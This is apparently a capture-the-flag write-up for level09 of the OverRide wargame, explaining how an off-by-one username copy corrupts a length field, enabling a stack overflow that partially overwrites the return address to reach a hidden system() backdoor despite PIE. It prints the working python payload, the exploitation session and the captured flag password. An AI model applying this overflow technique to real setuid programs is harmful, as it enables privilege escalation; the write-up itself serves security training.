# Level09

## Solution

* There is one file in our home, ```level09```, belonging to ```end``` user, with suid.
* Here's the hand-decompiled source code we propose for this binary: [source.c](source.c)

* For the sake of clarity, we won't display the disassembled code, but we will describe its behaviour:

	* ```main()``` only outputs a welcome mesage and calls ```handle_msg()```
	* ```handle_msg``` declares a on-stack structure that we will call ```data```, featuring:
		* a ```0x8c``` bytes buffer ```message```
		* a ```0x28``` bytes buffer ```username```
		* an ```int``` ```value```
	* ```set_username()``` is then called by ```main()``` with ```data``` in parameter:
		* prompts for a username
		* gets it with ```fgets()``` with a limit of ```0x80``` bytes
		* copies it bytes per bytes in ```username``` with a limit of ```0x29``` bytes
	* ```set_msg``` is then called by ```main()``` with ```data``` in parameter:
		* prompts for a message
		* gets it with ```fgets()``` with a limit of ```0x400``` bytes
		* copies it with ```strncpy()``` with a limit of ```value``` bytes
	* an additionnal function, ```secret_backdoor``` gets a command with ```fgets()``` and launches it with ```system()```. This function is never called by the program

* What we did with all of that:

	* our goal was to find a way to jump to ```secret_backdoor()``` function by changing the value at the location of the former ```rip```, in ```handle_msg()``` to point towards ```secret_backdoor()```
	* to do so, we first had to change the value of ```data.value``` to perform a bufferoverflow on ```data.message```
	* as ```set_username``` copies up to ```0x29``` bytes in the ```0x28``` bytes ```data.username``` buffer, and as ```value``` is contiguous to it, we could change the value of ```data.value```
	* then we had to find the offset between the beginning of ```data.message``` and former ```rip``` value: we use ```gdb peda``` and find it is ```0xc8 = 200``` bytes
	* last, but not least, problem : PIE (position independant executables) is enabled, that is to say the address of the segments will change for each execution : we can't know in advance the entire address of ```secret_backdoor()```
	* luckily the final 1 byte and a half are constant and we can see that launching ```objdump -D -M intel level09```: ```000000000000088c <secret_backdoor>:```
	* in addition, launching the program in ```gdb peda``` allows to see that there is constantly a ```4``` before the last 1 byte and a half
	* as addresses are little endian written, we could access first the two last bytes without modifying the variable part of the address
	* finally we wrote the user inputs in single file:
	```sh
	python -c "print('A' * 40 + '\xca' + 'B' * 86 + 'C' * 200 + '\x48\x8c'[::-1])" > /var/crash/lvl9
	```
	* ```0xca = 202```, the number of bytes we want to copy with ```strncpy()``` so that no ```\0``` is appended
	* Finally:
	```
	level09@OverRide:~$ cat /var/crash/lvl9 - | ./level09
	--------------------------------------------
	|   ~Welcome to l33t-m$n ~    v1337        |
	--------------------------------------------
	>: Enter your username
	>>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�>: Msg @Unix-Dude
	>>: >: Msg sent!
	cd ../end; cat .pass
	j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE
	```
